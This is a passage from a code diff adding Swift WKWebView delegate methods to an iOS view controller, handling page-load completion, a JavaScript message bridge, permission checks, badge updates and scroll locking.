+        
+    }
+    
+    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
+        
+    }
+    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+        print("Finish WkWebView")
+        SVProgressHUD.dismiss()
+        UIView.transition(with: self.waitImage, duration: 0.3, options: .transitionCrossDissolve, animations: {
+            self.waitImage.isHidden = true
+        }, completion: nil)
+        UIView.animate(withDuration: 1.5) {
+            self.webView.alpha = 1.0
+        }
+        reachabilityManager?.stopListening()
+        permission()
+        checkPermission()
+        let badgeValue = Int.badgeNumber()
+        UserDefaults.standard.setValue(badgeValue, forKey: "badge")
+        UIApplication.shared.applicationIconBadgeNumber = badgeValue
+    }
+    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
+        WebViewBridge.shared.handlerViewController(self, wkWebView: self.webView, handlerWKScriptMessage: message)
+    }
+    func scrollViewDidScroll(_ scrollView: UIScrollView) {
+        let newOffset = scrollView.contentOffset
+        if newOffset.y > 0 {
+            scrollView.contentOffset = .zero
+        }
+    }
+}
 class NoKeyboardTextField: UITextField {
     override var canBecomeFirstResponder: Bool {
         return false
